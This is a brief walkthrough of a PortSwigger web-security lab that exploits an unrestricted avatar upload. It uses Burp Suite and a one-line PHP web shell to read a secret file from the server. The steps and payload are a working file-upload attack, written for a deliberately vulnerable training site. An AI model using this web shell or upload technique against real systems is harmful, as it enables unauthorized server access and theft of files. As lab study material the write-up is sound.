# [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

> uploading a malicious php file as an avatar

- boot up burp suite
- log in
- upload an image (any small image)
- go back to the profile page
- check the burp suite proxy history (turn filters off if necessary)
- there is a request for the image for avatar
- this request will be the exploit request -> send it to repeater

> exploit php file

- create a file called `exploit.php`

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- upload the file again as an avatar
- change the request of in the repeater:
  `GET /files/avatars/image.jpg HTTP/2` -> `GET /files/avatars/exploit.php HTTP/2`
- send the request
- in the response there is a `string`, submit that
